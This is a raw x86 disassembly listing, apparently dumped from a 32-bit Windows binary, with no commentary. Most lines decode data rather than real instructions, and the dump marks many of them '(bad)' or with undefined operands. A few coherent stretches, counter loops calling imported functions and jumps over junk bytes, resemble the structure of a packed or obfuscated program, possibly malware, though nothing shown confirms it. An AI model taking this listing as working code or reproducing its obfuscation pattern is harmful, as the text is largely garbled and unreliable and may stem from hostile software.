  407286:	test   al,0xf0
  407288:	hlt    
  407289:	shl    edx,cl
  40728b:	fs sub eax,0x9ed25596
  407291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407292:	cli    
  407293:	lods   eax,DWORD PTR ds:[esi]
  407294:	cld    
  407295:	or     eax,0x6649bb54
  40729a:	jae    0x4072dc
  40729c:	stc    
  40729d:	int    0x61
  40729f:	mov    esi,0xcdcee131
  4072a4:	push   esi
  4072a5:	push   esp
  4072a6:	repnz mov edx,0x4d2f2282
  4072ac:	and    BYTE PTR [edi+0x38],0xe5
  4072b0:	out    dx,al
  4072b1:	aas    
  4072b2:	stc    
  4072b3:	mov    dl,0x60
  4072b5:	or     bh,BYTE PTR ds:0xb048cd83
  4072bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072bc:	push   ebx
  4072bd:	int3   
  4072be:	retf   0x8b1b
  4072c1:	push   ebp
  4072c2:	loopne 0x40724f
  4072c4:	pop    ebp
  4072c5:	clc    
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0xf7430f0c
  4072e9:	into   
  4072ea:	cli    
  4072eb:	clc    
  4072ec:	sbb    BYTE PTR [esi+0x7e],bh
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x40734d
  4072f4:	sti    
  4072f5:	sub    al,dl
  4072f7:	adc    ecx,DWORD PTR [esi+0x6bb99fa1]
  4072fd:	mov    dl,0x1e
  4072ff:	mov    ah,0x0
  407301:	rol    BYTE PTR [eax],1
  407303:	xchg   DWORD PTR [edx*4-0x13557cab],edi
  40730a:	scas   eax,DWORD PTR es:[edi]
  40730b:	or     al,0x1e
  40730d:	inc    ecx
  40730e:	shl    BYTE PTR [edi],1
  407310:	ins    DWORD PTR es:[edi],dx
  407311:	out    dx,al
  407312:	ret    0xb753
  407315:	dec    ebp
  407316:	add    BYTE PTR [ecx+0x51759ff7],0xfa
  40731d:	ins    DWORD PTR es:[edi],dx
  40731e:	jp     0x4072ca
  407320:	xor    edx,ebp
  407322:	cmc    
  407323:	mov    bh,0x98
  407325:	mov    al,ds:0x836c713d
  40732a:	cmp    al,0xbc
  40732c:	push   ebx
  40732d:	push   eax
  40732e:	cwde   
  40732f:	cmc    
  407330:	imul   DWORD PTR [ecx-0x9e03abf]
  407336:	std    
  407337:	int3   
  407338:	jbe    0x40739f
  40733a:	sbb    eax,0x81d54a1b
  40733f:	into   
  407340:	shl    BYTE PTR [edi],0xf8
  407343:	inc    DWORD PTR [ebx+0x2a]
  407346:	dec    esp
  407347:	dec    esi
  407348:	or     DWORD PTR [eax+0x69],ecx
  40734b:	mov    esi,0x2c455129
  407350:	and    dh,bl
  407352:	jp     0x4073ca
  407354:	nop
  407355:	pop    ss
  407356:	popa   
  407357:	cmp    al,0x74
  407359:	mov    cl,0x59
  40735b:	call   FWORD PTR [edi]
  40735d:	adc    DWORD PTR [ecx-0x1da69a48],esi
  407363:	inc    ebx
  407364:	lods   eax,DWORD PTR ds:[esi]
  407365:	int3   
  407366:	clc    
  407367:	add    eax,0x85a5ac09
  40736c:	mov    bl,0x31
  40736e:	(bad)  
  407370:	jecxz  0x40730d
  407372:	pop    es
  407373:	inc    edx
  407374:	pop    esp
  407375:	dec    eax
  407376:	add    ebp,DWORD PTR [esi+eax*4-0x49]
  40737a:	mov    ebp,0x8a60584c
  40737f:	mov    edi,0x9a774588
  407384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407385:	fcmovnu st,st(5)
  407387:	mov    ds:0x94725c86,al
  40738c:	int3   
  40738d:	xor    edi,eax
  40738f:	or     ch,dh
  407391:	(bad)  
  407392:	out    dx,al
  407393:	test   al,0x97
  407395:	shr    ecx,cl
  407397:	push   ebx
  407398:	imul   esp,DWORD PTR [esi-0x4ba48da5],0x6a
  40739f:	pop    edi
  4073a0:	es xor al,0xbb
  4073a3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073a5:	pop    edx
  4073a6:	(bad)  
  4073a7:	in     eax,dx
  4073a8:	dec    edx
  4073a9:	inc    ebp
  4073aa:	test   BYTE PTR [edx-0x6ddf5040],al
  4073b0:	jb     0x40733c
  4073b2:	addr16 pop ebx
  4073b4:	jmp    0x1b66:0xb0ce428c
  4073bb:	in     al,0x3a
  4073bd:	sti    
  4073be:	and    eax,0xdbd5867f
  4073c3:	mov    al,0x3c
  4073c5:	and    DWORD PTR [eax],edx
  4073c7:	imul   ebx,esi,0xb1102cdf
  4073cd:	pushf  
  4073ce:	push   ecx
  4073cf:	(bad)  
  4073d0:	mov    ss,WORD PTR [edx-0x2665696d]
  4073d6:	sbb    DWORD PTR [esi-0x6c],esp
  4073d9:	mov    esi,0x71ab2f65
  4073de:	(bad)  
  4073df:	ins    BYTE PTR es:[edi],dx
  4073e0:	xor    bl,BYTE PTR [eax-0x21]
  4073e3:	inc    ecx
  4073e4:	call   0xa045:0x65547ee
  4073eb:	mov    esi,0xb81f43eb
  4073f0:	fisubr WORD PTR [ecx+0x4478e381]
  4073f6:	and    al,0xd7
  4073f8:	jl     0x4073b6
  4073fa:	mov    bh,0xd1
  4073fc:	mov    edi,0xcf9374fc
  407401:	cdq    
  407402:	in     eax,0x12
  407404:	(bad)  
  407405:	push   ss
  407406:	aaa    
  407407:	inc    edi
  407408:	jae    0x407421
  40740a:	les    esi,FWORD PTR [ecx]
  40740c:	scas   al,BYTE PTR es:[edi]
  40740d:	popf   
  40740e:	xchg   esi,eax
  40740f:	sahf   
  407410:	ficom  WORD PTR [edi+0x18]
  407413:	push   ecx
  407414:	or     BYTE PTR [edx-0x70],bh
  407417:	xor    BYTE PTR [ebx+0xa9ce6db],al
  40741d:	mov    ebx,ecx
  40741f:	out    dx,al
  407420:	cmp    eax,DWORD PTR [esi-0x5217e229]
  407426:	icebp  
  407427:	daa    
  407428:	pop    edi
  407429:	leave  
  40742a:	ret    0x8
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1+0x38f127ff],edi
  407443:	jl     0x407447
  407445:	lods   eax,DWORD PTR ds:[esi]
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0xbebef2cd
  40744e:	sub    ch,bh
  407450:	xor    BYTE PTR [esi],ah
  407452:	prefetch BYTE PTR [ecx]
  407455:	call   0x8a576d5f
  40745a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40745b:	(bad)  
  40745c:	mov    dh,0x14
  40745e:	mov    al,0xc4
  407460:	push   edi
  407461:	jmp    0x118cbc59
  407466:	fisttp DWORD PTR [ebx]
  407468:	jb     0x407483
  40746a:	jecxz  0x4074ac
  40746c:	adc    bl,BYTE PTR [ecx]
  40746e:	dec    esp
  40746f:	scas   al,BYTE PTR es:[edi]
  407470:	inc    ebp
  407471:	imul   edx,DWORD PTR gs:[eax+0x38274d66],0xf9b2350c
  40747c:	cmc    
  40747d:	stc    
  40747e:	sbb    DWORD PTR [eax-0x2e],0xa1a58b75
  407485:	xlat   BYTE PTR ds:[ebx]
  407486:	adc    BYTE PTR [ecx],al
  407488:	jbe    0x4074c7
  40748a:	xchg   edx,eax
  40748b:	pop    esi
  40748c:	mov    ch,ah
  40748e:	lods   eax,DWORD PTR ds:[esi]
  40748f:	sahf   
  407490:	pop    edi
  407491:	popf   
  407492:	add    eax,0x2040fd41
  407497:	imul   BYTE PTR [ecx-0x475a415e]
  40749d:	and    al,0x9d
  40749f:	idiv   edi
  4074a1:	shl    esi,cl
  4074a3:	fldcw  WORD PTR [edi]
  4074a5:	mov    ecx,0x5fe913e3
  4074aa:	xchg   esi,eax
  4074ab:	xchg   ebx,eax
  4074ac:	dec    ebx
  4074ad:	adc    al,0x13
  4074af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b0:	hlt    
  4074b1:	push   ebx
  4074b2:	(bad)  
  4074b3:	cmp    edi,eax
  4074b5:	imul   esp,eax,0x29
  4074b8:	pop    edx
  4074b9:	jnp    0x407453
  4074bb:	jnp    0x407523
  4074bd:	in     eax,0x1
  4074bf:	rcl    DWORD PTR ds:0xde893ac9,cl
  4074c5:	jns    0x4074da
  4074c7:	out    dx,eax
  4074c8:	clc    
  4074c9:	pop    ss
  4074ca:	pop    ebx
  4074cb:	push   ebx
  4074cc:	cmp    eax,0xaaacbb9f
  4074d1:	dec    esp
  4074d2:	repz add dl,dl
  4074d5:	mov    DWORD PTR [esi-0x72],ebx
  4074d8:	retf   
  4074d9:	jmp    0xbf4b04d6
  4074de:	setg   BYTE PTR [edi]
  4074e1:	xchg   esi,eax
  4074e2:	push   es
  4074e3:	pop    esi
  4074e4:	add    DWORD PTR [edi-0x3d7e70a0],ebp
  4074ea:	cmp    dh,BYTE PTR ds:0xb3233772
  4074f0:	jmp    0x5374:0x9ee75be3
  4074f7:	xchg   DWORD PTR ds:0xf615a7c4,edx
  4074fd:	xchg   ebp,eax
  4074fe:	adc    DWORD PTR [ebx-0x2b],edx
  407501:	inc    ecx
  407502:	pop    edi
  407503:	enter  0xc157,0x89
  407507:	ret    
  407508:	data16 sbb al,0xc9
  40750b:	mov    bl,dh
  40750d:	outs   dx,BYTE PTR ds:[esi]
  40750e:	stos   DWORD PTR es:[edi],eax
  40750f:	(bad)  
  407510:	(bad)  
  407511:	cwde   
  407512:	sbb    eax,0x3d57f1b6
  407517:	ss or  eax,0x8f811e38
  40751d:	jmp    0x25f:0xabfe9aab
  407524:	sub    eax,0x3a939074
  407529:	push   esi
  40752a:	rol    DWORD PTR [esi+0x5b],cl
  40752d:	data16 icebp 
  40752f:	in     eax,0x46
  407531:	mov    ch,0xb8
  407533:	mov    DWORD PTR [edx+0x652ad719],edi
  407539:	jnp    0x4075b5
  40753b:	bound  esi,QWORD PTR [edi+0xc]
  40753e:	in     al,dx
  40753f:	gs inc eax
  407541:	mov    esp,ecx
  407543:	aam    0xfc
  407545:	ja     0x4074e2
  407547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407548:	dec    esi
  407549:	(bad)  
  40754b:	test   al,0xa0
  40754d:	mov    al,ds:0x8cadaec2
  407552:	push   es
  407553:	dec    edi
  407554:	and    eax,0xc67a8cd0
  407559:	push   edx
  40755a:	sbb    ecx,DWORD PTR ds:0x88ff1eeb
  407560:	sbb    al,0x59
  407562:	adc    edi,DWORD PTR [esi-0x7f]
  407565:	dec    edx
  407566:	adc    ebp,esi
  407568:	repnz xchg ebx,eax
  40756a:	test   eax,0x1c04ca26
  40756f:	imul   ebp,DWORD PTR [edx-0x7a545ad3],0x358e3c70
  407579:	jae    0x4075f2
  40757b:	out    dx,eax
  40757c:	aaa    
  40757d:	sar    cl,0x53
  407580:	rol    BYTE PTR [ebp+ecx*4+0x3],0x48
  407585:	and    al,0x44
  407587:	jg     0x4075e5
  407589:	stos   DWORD PTR es:[edi],eax
  40758a:	pop    ebx
  40758b:	ins    DWORD PTR es:[edi],dx
  40758c:	xabort 0x5d
  40758f:	dec    esp
  407590:	fmul   st(1),st
  407592:	mov    ds:0x14c43b49,eax
  407597:	add    DWORD PTR [edx-0x4c],esp
  40759a:	adc    al,0x7e
  40759c:	xchg   ecx,eax
  40759d:	(bad)  
  40759e:	in     al,0x73
  4075a0:	das    
  4075a1:	(bad)  [edx]
  4075a3:	xchg   edi,eax
  4075a4:	jae    0x4075d9
  4075a6:	pop    edi
  4075a7:	mov    ah,0x9c
  4075a9:	adc    edi,esp
  4075ab:	pop    DWORD PTR [edx]
  4075ad:	sbb    al,0x53
  4075af:	shl    esp,1
  4075b1:	xchg   ecx,eax
  4075b2:	sub    al,0x29
  4075b4:	push   esp
  4075b5:	sub    BYTE PTR [edx+0x62],al
  4075b8:	and    al,BYTE PTR [edx+0x51516c05]
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x73]
  4076f9:	pop    edi
  4076fa:	sti    
  4076fb:	ins    DWORD PTR es:[edi],dx
  4076fc:	sbb    al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0x86bef584
  407705:	dec    eax
  407706:	sub    ecx,DWORD PTR [edi+0x69]
  407709:	fisttp DWORD PTR [ecx-0x604dc248]
  40770f:	xchg   BYTE PTR [edi-0x797b209a],dh
  407715:	dec    esi
  407716:	sub    al,0x86
  407718:	jle    0x40769c
  40771a:	fnsave [esi-0x29]
  40771d:	sbb    edi,ecx
  40771f:	sbb    al,0x0
  407721:	les    esp,FWORD PTR ds:0x8b78956f
  407727:	dec    esi
  407728:	mov    edx,0x19d53eb8
  40772d:	push   ebp
  40772e:	xchg   edi,eax
  40772f:	xchg   esp,eax
  407730:	mov    ah,0x3a
  407732:	jns    0x40770f
  407734:	(bad)  
  407735:	test   BYTE PTR [edi],0xee
  407738:	or     bl,BYTE PTR [esi]
  40773a:	iret   
  40773b:	mov    ecx,0x90817194
  407740:	ds out 0x8d,eax
  407743:	mov    bh,0x6
  407745:	fistp  DWORD PTR [esi-0x6c]
  407748:	aad    0xa8
  40774a:	mov    DWORD PTR [ebx-0x2b],0xc7f26fb5
  407751:	xchg   edx,eax
  407752:	loop   0x40771b
  407754:	xchg   ecx,eax
  407755:	sub    esp,0xd8a3d853
  40775b:	(bad)  
  40775c:	pop    eax
  40775d:	inc    ebx
  40775e:	imul   ecx,DWORD PTR [esi],0xd699dead
  407764:	test   eax,0xb870fb50
  407769:	cmc    
  40776a:	xor    BYTE PTR [ebp-0x70777959],ch
  407770:	ret    0xd355
  407773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407774:	ret    
  407775:	mov    dl,0xa1
  407777:	cdq    
  407778:	pop    ds
  407779:	jp     0x407752
  40777b:	adc    al,0xa2
  40777d:	lds    ecx,FWORD PTR [ebx+0x7ea4f0be]
  407783:	inc    esi
  407784:	mov    esp,0x295816d8
  407789:	outs   dx,BYTE PTR ds:[esi]
  40778a:	inc    eax
  40778b:	and    BYTE PTR [edx],dh
  40778d:	mov    cl,0xf
  40778f:	(bad)  
  407790:	and    edi,DWORD PTR [esi+eiz*1]
  407793:	fcomp  QWORD PTR [edi]
  407795:	out    0xa2,al
  407797:	and    DWORD PTR [edi-0x5f],ebx
  40779a:	int3   
  40779b:	fimul  WORD PTR [esi-0x5878aa27]
  4077a1:	push   0x69
  4077a3:	xor    al,0xd4
  4077a5:	aam    0x7b
  4077a7:	in     al,dx
  4077a8:	rol    BYTE PTR [ebp+0x4a5d2549],0x28
  4077af:	mov    ?,WORD PTR [eax-0x3d]
  4077b2:	jp     0x4077d6
  4077b4:	ret    
  4077b5:	in     al,0xdf
  4077b7:	xlat   BYTE PTR ds:[ebx]
  4077b8:	adc    esp,DWORD PTR [ebp-0x310a5cfe]
  4077be:	repnz not esp
  4077c1:	xor    BYTE PTR [edx-0x209ee4fb],al
  4077c7:	sbb    DWORD PTR [ebx+0x1c04bf17],esp
  4077cd:	(bad)  
  4077ce:	jmp    0x3ec4df30
  4077d3:	fdiv   st(3),st
  4077d5:	xor    DWORD PTR [ecx+0x271b3fa2],ecx
  4077db:	je     0x407828
  4077dd:	ret    0xe06e
  4077e0:	xor    ebx,DWORD PTR [edx]
  4077e2:	jnp    0x40784e
  4077e4:	mov    edi,0xbe81b55d
  4077e9:	push   ebp
  4077ea:	mov    ch,BYTE PTR [ebp-0x38f9624d]
  4077f0:	loop   0x407779
  4077f2:	out    dx,al
  4077f3:	loop   0x4077a7
  4077f5:	jl     0x407803
  4077f7:	xor    al,0x20
  4077f9:	les    ebx,FWORD PTR [ecx+0x18c89b66]
  4077ff:	jns    0x40787e
  407801:	pop    ecx
  407802:	sub    dh,BYTE PTR [ebx+esi*2+0x23]
  407806:	fcomp  QWORD PTR ds:0x79c5dd18
  40780c:	lods   al,BYTE PTR ds:[esi]
  40780d:	inc    ecx
  40780e:	stos   BYTE PTR es:[edi],al
  40780f:	pop    ebp
  407810:	(bad)  
  407811:	xchg   esi,eax
  407812:	ror    BYTE PTR [eax-0x3ae87149],1
  407818:	ret    
  407819:	or     BYTE PTR ds:0xec057e74,bl
  40781f:	sbb    al,0x13
  407821:	mov    dl,0xb5
  407823:	push   ss
  407824:	and    cl,BYTE PTR [edi]
  407826:	ficom  WORD PTR [eax]
  407828:	mov    dh,0x6c
  40782a:	xchg   ebx,eax
  40782b:	loopne 0x4077d3
  40782d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40782e:	ror    BYTE PTR [edi+ebx*2],0x19
  407832:	(bad)  
  407833:	scas   al,BYTE PTR es:[edi]
  407834:	lods   eax,DWORD PTR ds:[esi]
  407835:	leave  
  407836:	push   ecx
  407837:	adc    al,0xe9
  407839:	xlat   BYTE PTR ds:[ebx]
  40783a:	mov    eax,0x31e37e66
  40783f:	ins    BYTE PTR es:[edi],dx
  407840:	das    
  407841:	jbe    0x40783d
  407843:	out    dx,al
  407844:	push   ds
  407845:	test   al,0x67
  407847:	add    BYTE PTR [esi+0x26],0x44
  40784b:	sub    esp,ecx
  40784d:	dec    edi
  40784e:	xchg   edx,eax
  40784f:	sub    esp,DWORD PTR [eax-0x7d]
  407852:	neg    DWORD PTR [eax+ebp*4]
  407855:	stos   BYTE PTR es:[edi],al
  407856:	xchg   ebp,eax
  407857:	mov    WORD PTR [esi+0x68],es
  40785a:	add    ah,BYTE PTR [edx-0x6c]
  40785d:	fadd   QWORD PTR [eax]
  40785f:	inc    ebx
  407860:	jge    0x40789b
  407862:	jb     0x4078c3
  407864:	or     BYTE PTR [ebx],ah
  407866:	cwde   
  407867:	inc    esi
  407868:	or     esp,esp
  40786a:	push   cs
  40786b:	pop    ds
  40786c:	inc    edi
  40786d:	dec    esp
  40786e:	dec    ebp
  40786f:	xchg   ebp,eax
  407870:	jmp    esp
  407872:	mov    eax,0x38b840f
  407877:	add    BYTE PTR [eax],al
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x16b25d74],0x1e
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x4078e3
  407897:	mov    eax,ds:0x1a84e5a1
  40789c:	jg     0x407856
  40789e:	xor    BYTE PTR [ebp+0x19],al
  4078a1:	push   esp
  4078a2:	ins    DWORD PTR es:[edi],dx
  4078a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a4:	push   esi
  4078a5:	jp     0x4078ea
  4078a7:	jbe    0x407830
  4078a9:	inc    edx
  4078aa:	retf   
  4078ab:	and    eax,0x38d89ff1
  4078b0:	sub    eax,0xecf6e689
  4078b5:	sbb    DWORD PTR [edx],ebp
  4078b7:	push   edx
  4078b8:	or     BYTE PTR [esi-0x47],0x24
  4078bc:	mov    al,BYTE PTR [ecx]
  4078be:	inc    ebp
  4078bf:	jns    0x40792a
  4078c1:	adc    ah,BYTE PTR [edi-0x586618e8]
  4078c7:	mov    dh,0x1
  4078c9:	sahf   
  4078ca:	rcl    DWORD PTR [edx+0xd02537f],0xf8
  4078d1:	ret    
  4078d2:	call   0x823002e9
  4078d7:	and    DWORD PTR [esi],0x42
  4078da:	inc    ebp
  4078db:	mov    WORD PTR [edx+0x64af5183],?
  4078e1:	ja     0x407928
  4078e3:	or     DWORD PTR [ecx+0x35],ebp
  4078e6:	in     al,0x7f
  4078e8:	pop    ebx
  4078e9:	je     0x4078f0
  4078eb:	xlat   BYTE PTR ds:[ebx]
  4078ec:	neg    ebx
  4078ee:	lahf   
  4078ef:	jl     0x407962
  4078f1:	jno    0x4078c0
  4078f3:	push   ebp
  4078f4:	mov    al,ds:0x9c4ebaef
  4078f9:	mov    bl,0xbd
  4078fb:	mov    ecx,0xc779d3e0
  407900:	cmp    al,0xc7
  407902:	je     0x407887
  407904:	pop    ebp
  407905:	int    0xd9
  407907:	addr16 pop ebp
  407909:	in     eax,dx
  40790a:	jne    0x40792d
  40790c:	mov    ah,0x4d
  40790e:	cli    
  40790f:	cs adc eax,0xdf6aedaa
  407915:	nop
  407916:	push   ebx
  407917:	xchg   esp,eax
  407918:	bound  esp,QWORD PTR [edx+0x60533c36]
  40791e:	inc    eax
  40791f:	mov    bl,0xbc
  407921:	cmp    eax,0xe48563e8
  407926:	mov    al,0xed
  407928:	test   DWORD PTR [edx+0x3079219],edi
  40792e:	sbb    ecx,DWORD PTR [edi+0x67]
  407931:	jg     0x407957
  407933:	jns    0x407958
  407935:	mov    ds:0xe333660c,eax
  40793a:	test   DWORD PTR es:[edi-0x382b9e58],edx
  407941:	jbe    0x4078cc
  407943:	xor    ah,BYTE PTR [esi+0x71]
  407946:	inc    ebp
  407947:	iret   
  407948:	out    dx,al
  407949:	mov    ecx,DWORD PTR [edi-0x24800222]
  40794f:	pop    esi
  407950:	out    dx,eax
  407951:	shl    BYTE PTR [eax],cl
  407953:	push   0xffffff82
  407955:	xchg   DWORD PTR [ebx-0x4d],esp
  407958:	sub    BYTE PTR [esi-0x191409d2],ah
  40795e:	mov    ch,0xb9
  407960:	xchg   esi,eax
  407961:	popf   
  407962:	jbe    0x407978
  407964:	mov    edi,0x839082e0
  407969:	pop    ss
  40796a:	ret    0xc03
  40796d:	stos   DWORD PTR es:[edi],eax
  40796e:	inc    esi
  40796f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407970:	sub    bl,0x82
  407973:	arpl   WORD PTR [ebx],ax
  407975:	cmp    BYTE PTR [ecx-0x1a],cl
  407978:	stos   BYTE PTR es:[edi],al
  407979:	and    edx,DWORD PTR [ecx-0x5c09d8b9]
  40797f:	dec    BYTE PTR [eax-0x17]
  407982:	dec    ebp
  407983:	call   0xff39:0x9756409a
  40798a:	js     0x407974
  40798c:	inc    esi
  40798d:	push   cs
  40798e:	mov    al,0xaf
  407990:	in     al,0x7b
  407992:	jmp    0x9c55415b
  407997:	mov    dl,0xe7
  407999:	mov    cl,0x31
  40799b:	mov    edx,0x8b4552a1
  4079a0:	mov    bh,0x8
  4079a2:	stc    
  4079a3:	jg     0x407a1c
  4079a5:	xor    DWORD PTR ds:0xfd021e31,ebp
  4079ab:	sub    BYTE PTR [ebp-0x7e376230],dl
  4079b1:	adc    eax,0xe74e03bf
  4079b6:	cli    
  4079b7:	aad    0x82
  4079b9:	icebp  
  4079ba:	jns    0x4079a6
  4079bc:	sbb    DWORD PTR [eax+edi*4+0x52],ebp
  4079c0:	arpl   WORD PTR [ebp+0x1a],si
  4079c3:	out    dx,eax
  4079c4:	scas   eax,DWORD PTR es:[edi]
  4079c5:	test   DWORD PTR [esp+edx*1+0x47],edx
  4079c9:	mov    dl,0xfa
  4079cb:	cmp    cl,BYTE PTR [eax]
  4079cd:	xor    eax,0xb416bc9c
  4079d2:	or     esp,DWORD PTR [ebx+0x1c8d49cf]
  4079d8:	sbb    ch,BYTE PTR [edi]
  4079da:	xchg   edi,eax
  4079db:	and    al,0x5b
  4079dd:	inc    edi
  4079de:	test   BYTE PTR [eax+0x32],dl
  4079e1:	push   ebx
  4079e2:	add    DWORD PTR [edi-0x5f],eax
  4079e5:	int3   
  4079e6:	loopne 0x4079d0
  4079e8:	mov    al,ds:0x3a27183d
  4079ed:	add    al,0xd6
  4079ef:	popf   
  4079f0:	out    dx,al
  4079f1:	stos   BYTE PTR es:[edi],al
  4079f2:	inc    ebp
  4079f3:	mov    esi,0x7e88151a
  4079f8:	xor    BYTE PTR [eax+0x41],bl
  4079fb:	mov    edx,DWORD PTR [eax-0x78]
  4079fe:	mov    esi,0xf11af333
  407a03:	retf   
  407a04:	inc    esp
  407a05:	mov    edx,DWORD PTR [ebp-0x8]
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0xd],0xee
  407a27:	mov    al,ds:0x7e127ed6
  407a2c:	jle    0x407a17
  407a2e:	jg     0x407aae
  407a30:	jle    0x4079e7
  407a32:	ja     0x4079cb
  407a34:	ficom  DWORD PTR ds:0x8d0c7e32
  407a3a:	pushf  
  407a3b:	jmp    0x517f:0x67ea364f
  407a42:	leave  
  407a43:	outs   dx,BYTE PTR ds:[esi]
  407a44:	mov    WORD PTR [edx+0x6e],cs
  407a47:	leave  
  407a48:	cmp    DWORD PTR [edi],esi
  407a4a:	neg    DWORD PTR [edx]
  407a4c:	ret    
  407a4d:	xchg   BYTE PTR [ebx-0x4ee2e8b3],dh
  407a53:	add    eax,0xd9a0882e
  407a58:	and    ebx,DWORD PTR [ebx+0x4e]
  407a5b:	mov    bh,0x94
  407a5d:	adc    esp,DWORD PTR [edx-0x5b164b9c]
  407a63:	adc    DWORD PTR [ebx-0x1a65c941],0x7e1d1b6f
  407a6d:	mov    cl,0x6c
  407a6f:	fxch   st(1)
  407a71:	or     ah,BYTE PTR ds:0x162badc7
  407a77:	retf   0xcfef
  407a7a:	dec    edx
  407a7b:	and    ebx,DWORD PTR [edi+0x52]
  407a7e:	test   al,0x67
  407a80:	cmp    ah,BYTE PTR [edx+0x4a]
  407a83:	sub    cl,BYTE PTR [ebx-0x6e]
  407a86:	and    edx,DWORD PTR [edx]
  407a88:	sbb    bh,dh
  407a8a:	jmp    0x346420ac
  407a8f:	dec    edi
  407a90:	xchg   esi,eax
  407a91:	sub    dl,bh
  407a93:	(bad)  
  407a96:	adc    edi,ecx
  407a98:	out    0x4d,eax
  407a9a:	sub    DWORD PTR [ebx+0x4e],ebx
  407a9d:	or     BYTE PTR [ebx+0x7e989b93],bl
  407aa3:	imul   edx,DWORD PTR [ebx],0x5a
  407aa6:	ror    BYTE PTR [ebp+0x24dad8e],cl
  407aac:	fs repz mov esp,0x18b9a42a
  407ab3:	xlat   BYTE PTR ds:[ebx]
  407ab4:	push   ss
  407ab5:	out    dx,al
  407ab6:	fucomp st(5)
  407ab8:	je     0x407ab5
  407aba:	xor    al,0x38
  407abc:	int    0xd2
  407abe:	cmp    eax,0xff101b7b
  407ac3:	xchg   DWORD PTR ds:0x7012fae9,esp
  407ac9:	sub    DWORD PTR [edx+0x6e],ebp
  407acc:	aam    0x2e
